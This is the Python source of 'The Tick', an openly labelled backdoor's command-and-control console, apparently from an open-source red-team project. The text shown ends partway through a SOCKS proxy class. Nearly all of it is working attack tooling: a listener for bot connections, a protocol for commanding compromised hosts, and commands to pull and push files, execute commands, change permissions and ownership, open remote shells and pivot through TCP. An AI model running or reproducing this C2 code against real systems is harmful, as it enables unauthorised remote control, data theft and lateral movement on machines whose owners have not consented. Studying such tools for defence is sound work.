#!/usr/bin/env python3
# -*- coding: utf8 -*-

"""
The Tick, a simple backdoor for servers and embedded systems.

Developed by Mario Vilas, mvilas@gmail.com
http://www.github.com/MarioVilas/thetick

Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
http://www.github.com/nccgroup/thetick

See the LICENSE file for further details.
"""

TICK_VERSION = "0.2"

##############################################################################
# Imports and other module initialization.

# This namespace is pretty cluttered so make sure
# "from tick import *" doesn't make too much of a mess.
__all__ = ["Listener", "Console", "BotError"]

# Standard imports...
import sys
import readline
import os
import os.path
import ssl
import posixpath
import ntpath
import code
import errno

# More standard imports...
from socket import *
from struct import *
from select import select
from cmd import Cmd
from shlex import split
from threading import Thread, RLock
from traceback import print_exc
from uuid import UUID
from collections import OrderedDict
from argparse import ArgumentParser
from time import sleep
from functools import wraps
from multiprocessing import Process, Pipe
from subprocess import check_output, check_call, CalledProcessError
from collections import namedtuple
from base64 import b64decode

# Determine how OS level dependencies are installed.
# We're not actually gonna run this command, it's just for show.
from platform import platform
PLATFORM = platform()
if "Ubuntu" in PLATFORM:
    APT = "sudo apt install"
elif "Debian" in PLATFORM:
    APT = "sudo apt-get install"
elif "Fedora" in PLATFORM:
    APT = "dnf install"
elif "CentOS" in PLATFORM:
    APT = "yum install"
elif "RedHat" in PLATFORM:
    APT = "yum install"
else:
    APT = "sudo apt-get install"    # we don't know :(

# This is our first dependency and we check it now so
# we know if we can use colors to show errors later.
try:
    from colorama import *

    # Disable colors if requested.
    #
    # Note that we have do do this here rather than
    # when parsing the command line arguments, since
    # several error conditions would happen before that.
    # or even withing argparse itself.
    #
    # Unfortunately this also disables all the other nifty
    # console tricks we can do with ANSI escapes too. :(

    if "--no-color" in sys.argv:
        ANSI_ENABLED = False
        init(wrap = True, strip = True)
    else:
        ANSI_ENABLED = True
        init()

except ImportError:
    print("Missing dependency: colorama")
    print("  pip install colorama")
    exit(1)

# Adds support for colors to argparse. Very important, yes!
try:
    from argparse_color_formatter import ColorHelpFormatter
except ImportError:
    print("Missing dependency: " + Style.BRIGHT + Fore.RED + "argparse_color_formatter" + Style.RESET_ALL)
    print(Style.BRIGHT + Fore.BLUE + "  pip install -r requirements.txt" + Style.RESET_ALL)
    exit(1)

# ASCII art tables. Of course we need this, why do you ask?
try:
    from texttable import Texttable
except ImportError:
    print("Missing dependency: "+ Style.BRIGHT + Fore.RED + "texttable" + Style.RESET_ALL)
    print(Style.BRIGHT + Fore.BLUE + "  pip install -r requirements.txt" + Style.RESET_ALL)
    exit(1)

# Ok, this dependency is actually kind of a big deal.
# Still, let's make it optional and just disable the mount command if missing.
# That's because we depend on the distro, as it simply cannot be installed from pip.
try:
    import fuse
    if not hasattr(fuse, '__version__'):
        print("Broken dependency: "+ Style.BRIGHT + Fore.RED + "fuse" + Style.RESET_ALL)
        print("It seems to be an old or incompatible version.")
        print("We recommend installing the version that comes with your Linux distribution:")
        print(Style.BRIGHT + Fore.BLUE + "  " + APT + " python3-fuse" + Style.RESET_ALL)
        HAVE_FUSE = False
    else:
        fuse.fuse_python_api = (0, 2)
        HAVE_FUSE = True
except ImportError:
    HAVE_FUSE = False
    print("Missing dependency: "+ Style.BRIGHT + Fore.RED + "fuse" + Style.RESET_ALL)
    print(Style.BRIGHT + Fore.BLUE + "  " + APT + " python3-fuse" + Style.RESET_ALL)

##############################################################################
# Some good old blobs. Nothing says "trust this code and run it" like blobs.

# Boring banner :(
BORING_BANNER = b64decode("""
G1szMm0bWzFt4pWU4pWm4pWXG1syMm3ilKwg4pSs4pSM4pSA4pSQICAbWzFt4pWU4pWm4pWXG1sy
Mm3ilKzilIzilIDilJDilKzilIzilIAbWzBtChtbMzJtG1sxbSDilZEgG1syMm3ilJzilIDilKTi
lJzilKQgICAbWzFtIOKVkSAbWzIybeKUguKUgiAg4pSc4pS04pSQG1swbQobWzMybRtbMW0g4pWp
IBtbMjJt4pS0IOKUtOKUlOKUgOKUmCAgG1sxbSDilakgG1syMm3ilLTilJTilIDilJjilLQg4pS0
G1swbQo=
""").decode("utf8")

# Fun banner :)
FUN_BANNER = b64decode("""
ChtbMzFtG1sxbeKWhOKWhOKWhOKWiOKWiOKWiOKWiOKWiBtbMjJt4paTIBtbMW3ilojilogbWzIy
beKWkSAbWzFt4paI4paIG1syMm0g4paTG1sxbeKWiOKWiOKWiOKWiOKWiCAgICDiloTiloTiloTi
lojilojilojilojilogbWzIybeKWkyAbWzFt4paI4paIG1syMm3ilpMgG1sxbeKWhOKWiOKWiOKW
iOKWiOKWhCAgIOKWiOKWiCDiloTilojiloAbWzIybQobWzIybeKWkyAgG1sxbeKWiOKWiBtbMjJt
4paSIOKWk+KWkuKWkxtbMW3ilojilogbWzIybeKWkSAbWzFt4paI4paIG1syMm3ilpLilpMbWzFt
4paIG1syMm0gICAbWzFt4paAG1syMm0gICAg4paTICAbWzFt4paI4paIG1syMm3ilpIg4paT4paS
4paTG1sxbeKWiOKWiBtbMjJt4paS4paSG1sxbeKWiOKWiOKWgCDiloDiloggICDilojilojiloTi
logbWzIybeKWkiAbWzIybQobWzIybeKWkiDilpMbWzFt4paI4paIG1syMm3ilpEg4paS4paR4paS
G1sxbeKWiOKWiOKWgOKWgOKWiOKWiBtbMjJt4paR4paSG1sxbeKWiOKWiOKWiBtbMjJtICAgICAg
4paSIOKWkxtbMW3ilojilogbWzIybeKWkSDilpLilpHilpIbWzFt4paI4paIG1syMm3ilpLilpIb
WzFt4paT4paIICAgIOKWhCDilpPilojilojilojiloQbWzIybeKWkSAbWzIybQobWzIybeKWkSDi
lpMbWzFt4paI4paIG1syMm3ilpMg4paRIOKWkRtbMW3ilpPilogbWzIybSDilpEbWzFt4paI4paI
G1syMm0g4paS4paTG1sxbeKWiCAg4paEG1syMm0gICAg4paRIOKWkxtbMW3ilojilogbWzIybeKW
kyDilpEg4paRG1sxbeKWiOKWiBtbMjJt4paR4paSG1sxbeKWk+KWk+KWhCDiloTilojilojilpLi
lpMbWzFt4paI4paIIOKWiOKWhCAbWzIybQobWzIybSAg4paS4paIG1sxbeKWiBtbMjJt4paSIOKW
kSDilpEbWzFt4paT4paI4paSG1syMm3ilpHilogbWzFt4paIG1syMm3ilpPilpHilpIbWzFt4paI
4paI4paI4paIG1syMm3ilpIgICAgIOKWkuKWiBtbMW3ilogbWzIybeKWkiDilpEg4paRG1sxbeKW
iOKWiBtbMjJt4paR4paSIBtbMW3ilpPilojilojilojiloAbWzIybSDilpHilpLilogbWzFt4paI
G1syMm3ilpIgG1sxbeKWiOKWhBtbMjJtChtbMjJtICDilpIg4paR4paRICAgIBtbMW3ilpIbWzIy
bSDilpHilpEbWzFt4paS4paR4paSG1syMm3ilpHilpEg4paS4paRIOKWkSAgICAg4paSIOKWkeKW
kSAgIOKWkRtbMW3ilpMbWzIybSAg4paRIOKWkeKWkiDilpIgIOKWkeKWkiDilpLilpIgG1sxbeKW
kxtbMjJt4paSG1syMm0KG1syMm0gICAg4paRICAgICDilpIg4paR4paS4paRIOKWkSDilpEg4paR
ICDilpEgICAgICAg4paRICAgICDilpIg4paRICDilpEgIOKWkiAgIOKWkSDilpHilpIg4paS4paR
G1syMm0KG1syMm0gIOKWkSAgICAgICAbWzJt4paRG1syMm0gIOKWkeKWkSDilpEgICAbWzJt4paR
G1syMm0gICAgICAgIOKWkSAgICAgICDilpIg4paR4paRICAgICAgICAbWzJt4paRG1syMm0g4paR
4paRIBtbMm3ilpEbWzIybSAbWzIybQobWzJtICAgICAgICAgIOKWkSAg4paRICDilpEgICDilpEg
IOKWkSAgICAgICAgICAgICDilpEgIBtbMjJt4paRG1sybSDilpEgICAgICDilpEgIOKWkSAgIBtb
MjJtChtbMm0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4paRICAgICAg
ICAgICAgICAgG1syMm0KG1swbQ==
""").decode("utf8")

##############################################################################
# Custom TCP protocol definitions and helper functions.

# Base command IDs per category.
BASE_CMD_SYSTEM         = 0x0000
BASE_CMD_FILE           = 0x0100
BASE_CMD_NET            = 0x0200

# No operation command.
CMD_NOP                 = 0xFFFF

# System commands.
CMD_SYSTEM_EXIT         = BASE_CMD_SYSTEM + 0
CMD_SYSTEM_FORK         = BASE_CMD_SYSTEM + 1
CMD_SYSTEM_SHELL        = BASE_CMD_SYSTEM + 2

# File I/O commands.
CMD_FILE_PULL           = BASE_CMD_FILE + 0     # formerly CMD_FILE_READ
CMD_FILE_PUSH           = BASE_CMD_FILE + 1     # formerly CMD_FILE_WRITE
CMD_FILE_UNLINK         = BASE_CMD_FILE + 2     # formerly CMD_FILE_DELETE
CMD_FILE_EXEC           = BASE_CMD_FILE + 3
CMD_FILE_CHMOD          = BASE_CMD_FILE + 4
CMD_FILE_OPEN           = BASE_CMD_FILE + 5     # the following were added in v0.2
CMD_FILE_READ           = BASE_CMD_FILE + 6
CMD_FILE_WRITE          = BASE_CMD_FILE + 7
CMD_FILE_STAT           = BASE_CMD_FILE + 8
CMD_FILE_READDIR        = BASE_CMD_FILE + 9
CMD_FILE_READLINK       = BASE_CMD_FILE + 10
CMD_FILE_SYMLINK        = BASE_CMD_FILE + 11
CMD_FILE_LINK           = BASE_CMD_FILE + 12
CMD_FILE_RMDIR          = BASE_CMD_FILE + 13
CMD_FILE_MKDIR          = BASE_CMD_FILE + 14
CMD_FILE_CHOWN          = BASE_CMD_FILE + 15
CMD_FILE_ACCESS         = BASE_CMD_FILE + 16
CMD_FILE_STATVFS        = BASE_CMD_FILE + 17
CMD_FILE_TRUNCATE       = BASE_CMD_FILE + 18

# Network commands.
#CMD_HTTP_DOWNLOAD       = BASE_CMD_NET + 0  # deprecated in v0.2
CMD_DNS_RESOLVE         = BASE_CMD_NET + 1
CMD_TCP_PIVOT           = BASE_CMD_NET + 2

# Response codes.
CMD_STATUS_OK      = 0x00
CMD_STATUS_ERROR   = 0xFF

# Response structure for the file_stat call.
RESP_FILE_STAT = namedtuple('RESP_FILE_STAT', ('dev', 'ino', 'mode', 'nlink', 'uid', 'gid', 'rdev', 'size', 'blksize', 'blocks', 'atime', 'mtime', 'ctime'))

# Response structure for the file_statvfs call.
RESP_FILE_STATVFS = namedtuple('RESP_FILE_STATVFS', ('type', 'bsize', 'blocks', 'bfree', 'bavail', 'files', 'ffree', 'fsid', 'namelen', 'frsize', 'flags'))

# TCP pivot structure for IPv4.
# typedef struct              // (all values below in network byte order)
# {
#     uint32_t ip;            // IP address to connect to
#     uint16_t port;          // TCP port to connect to
#     uint16_t from_port;     // Optional TCP port to connect from
# } CMD_TCP_PIVOT_ARGS;
def build_pivot_struct(ip, port, from_port = 0):
    return inet_aton(ip) + pack("!HH", port, from_port)

# Command header.
# typedef struct
# {
#     uint16_t cmd_id;        // Command ID, one of the CMD_* constants
#     uint16_t cmd_len;       // Small data size, to be read in memory while parsing
#     uint32_t data_len;      // Big data size, to be read by command implementations
# } CMD_HEADER;

# Build the command header structure.
def build_command(cmd_id, cmd = b"", data = b""):
    cmd_len = len(cmd)
    try:
        data_len = len(data)
    except TypeError:
        data_len = data
        data = b""
    return pack("!HHL", cmd_id, cmd_len, data_len) + cmd + data

# Response header.
# typedef struct
# {
#     uint8_t  status;        // Status code (OK or error)
#     uint32_t data_len;      // Big data size
# } RESP_HEADER;

# Get only the response header from the socket.
# Data following the header must be read separately.
def get_resp_header(sock):
    header = sock.recv(5)
    if len(header) != 5:
        raise BotError("disconnected")
    status, data_len = unpack("!BL", header)
    if status == CMD_STATUS_ERROR:
        msg = b""
        if data_len > 0:
            msg = recvall(sock, data_len)
            if len(msg) != data_len:
                raise BotError("disconnected")
        raise BotError(msg.decode("utf8"))
    return data_len

# Skip bytes coming from the bot we don't actually need to read.
def skip_bytes(sock, count):
    while count > 0:
        num_bytes = len(sock.recv(count))
        if num_bytes == 0:
            raise BotError("disconnected")
        count = count - num_bytes

# Get the response header and ignore the response data.
# We'll use this for commands that don't require a response;
# that way even if the bot sends data we don't expect, the
# protocol won't break. Future compatibility FTW :)
def get_resp_no_data(sock):
    data_len = get_resp_header(sock)
    skip_bytes(sock, data_len)

# Read a fixed size block of data from a socket.
# Caller must ensure to check for errors.
def recvall(sock, count):
    buffer = b""
    while len(buffer) < count:
        tmp = sock.recv(min(65536, count - len(buffer)))
        if not tmp:
            break
        buffer = buffer + tmp
    return buffer

# Get the response header and the data, all together.
# We'll use this only for responses we assume have a reasonable
# amount of response data. TODO: perhaps make sure this is
# the case somehow - not too worried about this anyway.
def get_resp_with_data(sock):
    data_len = get_resp_header(sock)
    data = recvall(sock, data_len)
    if len(data) != data_len:
        raise BotError("disconnected")
    return data

# Copy a fixed amount of bytes from one file descriptor to another.
# If the data runs out before the operation is over, we fail silently.
# TODO: it'd be best to handle this error case too, but we must review
# how to do it specifically for each case.
def copy_stream(src, dst, count):
    while count > 0:
        buffer = src.read(min(65536, count))
        if not buffer:
            raise OSError("broken pipe")
        count = count - len(buffer)
        dst.write(buffer)

##############################################################################
# C&C server over a custom TCP protocol.

# This class is exported by the module so we can
# have C&C servers decoupled from the console UI.
# Well, in theory. One day. We'll see.
class Listener(Thread):
    "Listener C&C for The Tick bots."

    # Supported ciphers in order of preference.
    CIPHERS = [
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-ECDSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-AES256-GCM-SHA384',
        'DHE-RSA-AES128-GCM-SHA256',
        'DHE-DSS-AES128-GCM-SHA256',
        'kEDH+AESGCM',
        'ECDHE-RSA-AES128-SHA256',
        'ECDHE-ECDSA-AES128-SHA256',
        'ECDHE-RSA-AES128-SHA',
        'ECDHE-ECDSA-AES128-SHA',
        'ECDHE-RSA-AES256-SHA384',
        'ECDHE-ECDSA-AES256-SHA384',
        'ECDHE-RSA-AES256-SHA',
        'ECDHE-ECDSA-AES256-SHA',
        'DHE-RSA-AES128-SHA256',
        'DHE-RSA-AES128-SHA',
        'DHE-DSS-AES128-SHA256',
        'DHE-RSA-AES256-SHA256',
        'DHE-DSS-AES256-SHA',
        'DHE-RSA-AES256-SHA',
        '!aNULL',
        '!eNULL',
        '!EXPORT',
        '!DES',
        '!RC4',
        '!3DES',
        '!MD5',
        '!PSK'
    ]

    def __init__(self, callback, bind_addr = "0.0.0.0", port = 5555, ssl_port = 6666, keyfile = None, certfile = None):

        # True when running, False when shutting down.
        self.alive = False

        # Callback to be invoked every time a new bot connects.
        # The callback will receive two arguments, the listener
        # itself and the bot that just connected.
        self.callback = callback

        # Bind address and ports.
        self.bind_addr = bind_addr
        self.port = port
        self.ssl_port = ssl_port

        # Listening sockets.
        self.listen_sock = None
        self.ssl_listen_sock = None

        # SSL configuration.
        self.keyfile = keyfile
        self.certfile = certfile

        # Ordered dictionary with the bots that connected.
        # It will become apparent why we're using an ordered dict
        # instead of a regular dict once you read the source code
        # to the Console class.
        self.bots = OrderedDict()

        # Call the parent class constructor.
        super(Listener, self).__init__()

        # Set the thread as a daemon so way when the
        # main thread dies, this thread will die too.
        self.daemon = True

    # Context manager to ensure all the sockets are closed on exit.
    # The bind and listen code is here to make sure its use is mandatory.
    def __enter__(self):
        self.listen_sock = socket()
        self.listen_sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.listen_sock.bind((self.bind_addr, self.port))
        self.listen_sock.listen(5)
        if self.keyfile and self.certfile:
            self.ssl_listen_sock = socket()
            self.ssl_listen_sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            self.ssl_listen_sock.bind((self.bind_addr, self.ssl_port))
            self.ssl_listen_sock.listen(5)
        return self

    # Context manager to ensure all the sockets are closed on exit,
    # the "running" flag is set to False, and the "bots" dictionary
    # is cleared.
    def __exit__(self, *args):
        self.alive = False
        if self.listen_sock is not None:
            try:
                self.listen_sock.shutdown(2)
            except Exception:
                pass
            try:
                self.listen_sock.close()
            except Exception:
                pass
            self.listen_sock = None
        if self.ssl_listen_sock is not None:
            try:
                self.ssl_listen_sock.shutdown(2)
            except Exception:
                pass
            try:
                self.ssl_listen_sock.close()
            except Exception:
                pass
            self.ssl_listen_sock = None
        for bot in list(self.bots.values()):
            if bot.sock is not None:
                try:
                    bot.sock.shutdown(2)
                except Exception:
                    pass
                try:
                    bot.sock.close()
                except Exception:
                    pass
                bot.sock = None
        self.bots.clear()

    # This method is invoked in a background thread.
    # It receives incoming bot connetions and invokes the callback.
    def run(self):

        # Sanity check.
        if self.alive:
            return

        # We are running now! Yay! \o/
        self.alive = True

        # Use the context manager to ensure all resources are freed.
        with self:

            # Loop until we are signaled to stop.
            while self.alive:
                try:

                    # Accept an incoming bot connection.
                    # This is a blocking call and the background
                    # thread will spend most of the time stuck here.
                    socks = [s for s in (self.listen_sock, self.ssl_listen_sock) if s is not None]
                    socks, _, _ = select(socks, [], [])
                    for s in socks:
                        sock, from_addr = s.accept()
                        try:

                            # Uh-oh, someone asked us to stop, so quit now.
                            if not self.alive:
                                try:
                                    sock.shutdown(2)
                                except Exception:
                                    pass
                                try:
                                    sock.close()
                                except Exception:
                                    pass
                                break

                            # If it's the SSL port, initiate SSL.
                            if s is self.ssl_listen_sock:
                                sock = ssl.wrap_socket(sock,
                                    server_side = True,
                                    ssl_version = ssl.PROTOCOL_TLSv1_2,
                                    do_handshake_on_connect = True,
                                    keyfile = self.keyfile,
                                    certfile = self.certfile,
                                    ciphers = ':'.join(self.CIPHERS)
                                )

                            # The first 16 bytes that come from the socket
                            # must be the bot UUID value. This value is
                            # generated randomly by the bot when starting up.
                            # It DOES NOT identify the target machine, but
                            # rather the bot instance, so multiple instances
                            # on the same machine will have different UUIDs.
                            uuid = recvall(sock, 16)
                            if len(uuid) != 16:
                                continue
                            uuid = str(UUID(bytes = uuid))

                            # Instance a Bot object for this new connection.
                            bot = Bot(sock, uuid, from_addr)

                            # Keep it in the ordered dictionary. This means
                            # the dictionary will remember the order in which
                            # the bots connected. This is useful for the Console
                            # class later on.
                            self.bots[uuid] = bot

                        # On error make sure to destroy the accepted socket.
                        except:
                            try:
                                sock.shutdown(2)
                            except Exception:
                                pass
                            try:
                                sock.close()
                            except Exception:
                                pass
                            raise

                        # Invoke the callback function to notify
                        # a new bot has connected to the C&C.
                        try:
                            self.callback(self, bot)
                        except Exception:
                            print_exc()

                # Ignore exceptions and continue running.
                except Exception:
                    ##print_exc()   ## XXX DEBUG
                    pass

    # The accept() call is a bit particular in Python,
    # we can't just close the socket and call it a day.
    # This resulted in stubborn listener threads who simply
    # refused to die... extreme measures had to be taken. ;)
    def kill(self):
        "Forcefully kill the background thread."

        # Trivial case.
        if not self.alive:
            return

        # Set the flag to false so the thread
        # knows we are asking it to quit.
        self.alive = False

        # Connect briefly to the listnening port.
        # This will "wake up" the thread stuck
        # in the blocking socket accept() call.
        s = socket()
        try:
            s.connect(("127.0.0.1", self.port))
        finally:
            s.close()

##############################################################################
# How to talk to connected bots.

# Class for all bot related exceptions.
class BotError(RuntimeError):
    "The Tick bot error message."

# This decorator will do some basic checks on bot actions.
# It also catches some error conditions such as the bot being disconnected
# or the user canceling the operation with Control+C.
def bot_action(method):
    @wraps(method)
    def wrapper(self, *args, **kwds):
        if not self.alive:
            raise Exception("internal error")
        try:
            return method(self, *args, **kwds)
        except KeyboardInterrupt:
            self.alive = False
            try:
                self.sock.shutdown(2)
            except:
                pass
            try:
                self.sock.close()
            except:
                pass
            raise BotError("disconnected")
        except BotError as e:
            if str(e) == "disconnected":
                self.alive = False
            raise
    return wrapper

# This class is not exported because I don't see a real reason
# for a user of this module to manually instance Bot objects.
class Bot:
    "The Tick bot instance."

    def __init__(self, sock, uuid, from_addr):

        # True if we can send commands to this instance, False otherwise.
        # False could either mean the bot is dead or the socket is being
        # used for something else, since some commands reuse the C&C socket.
        self.alive = True

        # The C&C socket to talk to this bot.
        self.sock = sock

        # True if the bot is connected over SSL, False otherwise.
        self.encrypted = isinstance(sock, ssl.SSLSocket)

        # The UUID for this bot instance.
        # See Listener.run() for more details.
        self.uuid = uuid

        # IP address and remote port where the connection came from.
        #
        # The IP address may not be correct if the bot is behind a NAT.
        # You can run the file_exec command to figure out the real IP.
        # Use your imagination. ;)
        #
        # The port is not terribly useful right now, but when we add
        # support for having the bot listen on a port rather than
        # connect to us, this may come in handy.
        self.from_addr = from_addr

    # Useful for debugging.
    def __repr__(self):
        return "<Bot uuid=%s ip=%s port=%d connected=%s>" % (
            self.uuid, self.from_addr[0], self.from_addr[1],
            "yes" if self.alive else "no"
        )

    #
    # The remainder of this class are the supported commands.
    # The code is pretty straightforward so I did not comment it.
    #

    @bot_action
    def nop(self):
        self.sock.sendall( build_command(CMD_NOP) )
        get_resp_no_data(self.sock)

    @bot_action
    def system_exit(self):
        self.sock.sendall( build_command(CMD_SYSTEM_EXIT) )
        get_resp_no_data(self.sock)
        self.alive = False

    @bot_action
    def system_fork(self):
        self.sock.sendall( build_command(CMD_SYSTEM_FORK) )
        uuid_bytes = get_resp_with_data(self.sock)
        if uuid_bytes:
            return str(UUID(bytes=uuid_bytes))
        return

    @bot_action
    def system_shell(self):
        self.sock.sendall( build_command(CMD_SYSTEM_SHELL) )
        get_resp_no_data(self.sock)
        self.alive = False
        return self.sock

    @bot_action
    def file_pull(self, remote_file, local_file):
        self.sock.sendall( build_command(CMD_FILE_PULL, bytes(remote_file + "\0", encoding="utf8")) )
        data_len = get_resp_header(self.sock)
        with open(local_file, "wb") as fd:
            copy_stream(self.sock.makefile(mode="rb", buffering=0), fd, data_len)

    @bot_action
    def file_push(self, local_file, remote_file):
        with open(local_file, "rb") as fd:
            fd.seek(0, 2)
            file_size = fd.tell()
            fd.seek(0, 0)
            self.sock.sendall( build_command(CMD_FILE_PUSH, bytes(remote_file + "\0", encoding="utf8"), file_size) )
            copy_stream(fd, self.sock.makefile(mode="wb", buffering=0), file_size)
        get_resp_no_data(self.sock)

    @bot_action
    def file_unlink(self, remote_file):
        self.sock.sendall( build_command(CMD_FILE_UNLINK, bytes(remote_file + "\0", encoding="utf8")) )
        get_resp_no_data(self.sock)

    @bot_action
    def file_exec(self, command_line):
        self.sock.sendall( build_command(CMD_FILE_EXEC, bytes(command_line + "\0", encoding="utf8")) )
        return get_resp_with_data(self.sock)

    @bot_action
    def file_chmod(self, remote_file, mode_flags = 0o777):
        self.sock.sendall( build_command(CMD_FILE_CHMOD, pack("!H", mode_flags) + bytes(remote_file + "\0", encoding="utf8")) )
        get_resp_no_data(self.sock)

    @bot_action
    def file_open(self, remote_file, flags = os.O_RDWR, mode = 0o777):
        self.sock.sendall( build_command(CMD_FILE_OPEN, pack("!H", flags) + pack("!H", mode) + bytes(remote_file + "\0", encoding="utf8")) )
        resp = get_resp_with_data(self.sock)
        return unpack("!H", resp)[0]

    @bot_action
    def file_read(self, remote_file, size, offset = 0):
        self.sock.sendall( build_command(CMD_FILE_READ, pack("!L", size) + pack("!Q", offset) + bytes(remote_file + "\0", encoding="utf8")) )
        return get_resp_with_data(self.sock)

    @bot_action
    def file_write(self, remote_file, data, offset = 0):
        self.sock.sendall( build_command(CMD_FILE_WRITE, pack("!Q", offset) + bytes(remote_file + "\0", encoding="utf8"), data) )
        get_resp_no_data(self.sock)
        return len(data)

    @bot_action
    def file_truncate(self, remote_file, offset = 0):
        self.sock.sendall( build_command(CMD_FILE_TRUNCATE, pack("!Q", offset) + bytes(remote_file + "\0", encoding="utf8")) )
        get_resp_no_data(self.sock)

    @bot_action
    def file_stat(self, remote_path):
        self.sock.sendall( build_command(CMD_FILE_STAT, bytes(remote_path + "\0", encoding="utf8")) )
        data = get_resp_with_data(self.sock)
        return RESP_FILE_STAT(*(unpack("!QQQQQQQQQQQQQ", data)))

    @bot_action
    def file_readdir(self, remote_path):
        self.sock.sendall( build_command(CMD_FILE_READDIR, bytes(remote_path + "\0", encoding="utf8")) )
        data = get_resp_with_data(self.sock)
        data = [x for x in data.split(b"\0") if x]
        return data

    @bot_action
    def file_readlink(self, remote_file):
        self.sock.sendall( build_command(CMD_FILE_READLINK, bytes(remote_file + "\0", encoding="utf8")) )
        return get_resp_with_data(self.sock)

    @bot_action
    def file_symlink(self, linkname, target):
        self.sock.sendall( build_command(CMD_FILE_SYMLINK, bytes(linkname + "\0", encoding="utf8"), bytes(target + "\0", encoding="utf8")) )
        get_resp_no_data(self.sock)

    @bot_action
    def file_link(self, linkname, target):
        self.sock.sendall( build_command(CMD_FILE_LINK, bytes(linkname + "\0", encoding="utf8"), bytes(target + "\0", encoding="utf8")) )
        get_resp_no_data(self.sock)

    @bot_action
    def file_rmdir(self, remote_path):
        self.sock.sendall( build_command(CMD_FILE_RMDIR, bytes(remote_path + "\0", encoding="utf8")) )
        get_resp_no_data(self.sock)

    @bot_action
    def file_mkdir(self, remote_path, mode = 0o777):
        self.sock.sendall( build_command(CMD_FILE_MKDIR, pack("!H", mode) + bytes(remote_path + "\0", encoding="utf8")) )
        get_resp_no_data(self.sock)

    @bot_action
    def file_chown(self, remote_file, uid = 0, gid = 0):
        self.sock.sendall( build_command(CMD_FILE_CHOWN, pack("!L", uid) + pack("!L", gid) + bytes(remote_file + "\0", encoding="utf8")) )
        get_resp_no_data(self.sock)

    @bot_action
    def file_access(self, remote_file, mode_flags = 0):
        #define	R_OK	4		/* Test for read permission.  */
        #define	W_OK	2		/* Test for write permission.  */
        #define	X_OK	1		/* Test for execute permission.  */
        #define	F_OK	0		/* Test for existence.  */
        self.sock.sendall( build_command(CMD_FILE_ACCESS, pack("!H", mode_flags) + bytes(remote_file + "\0", encoding="utf8")) )
        try:
            get_resp_no_data(self.sock)
            return True
        except BotError as e:
            if str(e) == "":
                return False
            raise

    @bot_action
    def file_statvfs(self, remote_path):
        self.sock.sendall( build_command(CMD_FILE_STATVFS, bytes(remote_path + "\0", encoding="utf8")) )
        data = get_resp_with_data(self.sock)
        left = data[:7*8]
        middle = data[7*8:9*8]
        right = data[9*8:]
        joined = []
        joined.extend(unpack("!QQQQQQQ", left))
        joined.append(middle)
        joined.extend(unpack("!QQQ", right))
        return RESP_FILE_STATVFS(*joined)

    @bot_action
    def dns_resolve(self, domain):
        self.sock.sendall( build_command(CMD_DNS_RESOLVE, bytes(domain + "\0", encoding="utf8")) )
        response = get_resp_with_data(self.sock)
        answer = []
        while response:
            family = response[0]    # automatic conversion to integer
            if family == AF_INET:
                addr = response[1:5]
                response = response[5:]
            elif family == AF_INET6:
                addr = response[1:17]
                response = response[17:]
            else:
                raise Exception("internal error")
            answer.append(inet_ntop(family, addr))
        return answer

    @bot_action
    def tcp_pivot(self, address, port):
        self.sock.sendall( build_command(CMD_TCP_PIVOT, build_pivot_struct(address, port)) )
        get_resp_no_data(self.sock)
        self.alive = False
        return self.sock

##############################################################################
# Various background daemons for the console UI.

# Daemon for remote shells.
class RemoteShell(Thread):

    def __init__(self, sock):

        # Socket connected to a remote shell.
        self.sock = sock

        # Flag we'll use to tell the background thread to stop.
        self.alive = True

        # Call the parent class constructor.
        super(RemoteShell, self).__init__()

        # Set the thread as a daemon so way when the
        # main thread dies, this thread will die too.
        self.daemon = True

    # This method is invoked in a background thread.
    # It forwards everything coming from the remote shell to standard output.
    def run(self):
        try:
            while self.alive:
                buffer = self.sock.recv(1024)
                if not buffer:
                    break
                try:
                    try:
                        buffer = buffer.decode("utf8", "replace")
                    except UnicodeError:
                        buffer = buffer.decode("utf8", "ignore")
                except Exception:
                    buffer = repr(buffer)[1:-1].replace("\\n", "\n")
                sys.stdout.write(buffer)
                sys.stdout.flush()
        except:
            #print_exc()     # XXX DEBUG
            pass
        finally:
            try:
                self.sock.shutdown(2)
            except Exception:
                pass
            try:
                self.sock.close()
            except Exception:
                pass

    # This method is invoked from the main thread.
    # It forwards everything from standard input to the remote shell.
    # It launches the background thread and kills it before returning.
    # Control+C is caught within this function, which causes the
    # remote shell to be stopped without killing the console.
    def run_parent(self):
        self.start()
        try:
            while self.alive:
                buffer = sys.stdin.readline().encode("utf8")
                if not buffer:
                    break
                self.sock.sendall(buffer)
        except:     # DO NOT change this bare except: line
            pass    # I don't care what PEP8 has to say :P
        finally:
            self.alive = False
            try:
                self.sock.shutdown(2)
            except Exception:
                pass
            try:
                self.sock.close()
            except Exception:
                pass
            self.join()

# Pivoting daemon.
class TCPForward(Thread):

    def __init__(self, src_sock, dst_sock):

        # Keep the source and destination sockets.
        # This class only forwards in one direction,
        # so you have to instance it twice and swap
        # the source and destination sockets.
        self.src_sock = src_sock
        self.dst_sock = dst_sock

        # Flag we'll use to tell the background thread to stop.
        self.alive = False

        # Call the parent class constructor.
        super(TCPForward, self).__init__()

        # Set the thread as a daemon so way when the
        # main thread dies, this thread will die too.
        self.daemon = True

    # This method is invoked in a background thread.
    # It forwards everything from the source socket
    # into the destination socket. If either socket
    # dies the other is closed and the thread dies.
    def run(self):
        self.alive = True
        try:
            while self.alive:
                buffer = self.src_sock.recv(65535)
                if not buffer:
                    break
                self.dst_sock.sendall(buffer)
        except:
            pass
        finally:
            self.kill()

    # Forcefully kill the background thread.
    # This one is easier than the others. :)
    def kill(self):
        if not self.alive:
            return
        self.alive = False
        try:
            self.src_sock.shutdown(2)
        except Exception:
            pass
        try:
            self.src_sock.close()
        except Exception:
            pass
        try:
            self.dst_sock.shutdown(2)
        except Exception:
            pass
        try:
            self.dst_sock.close()
        except Exception:
            pass

# SOCKS proxy daemon.
class SOCKSProxy(Thread):

    def __init__(self, listener, uuid, bind_addr = "127.0.0.1", port = 1080, username = "", password = ""):

        # The listener that requested to proxy through a bot.
        self.listener = listener

        # The UUID of the bot we'll use to route proxy requests.
        self.uuid = uuid

        # The address to bind to when listening for SOCKS requests.
        # Normally 0.0.0.0 for a shared proxy, 127.0.0.1 for private.
        self.bind_addr = bind_addr

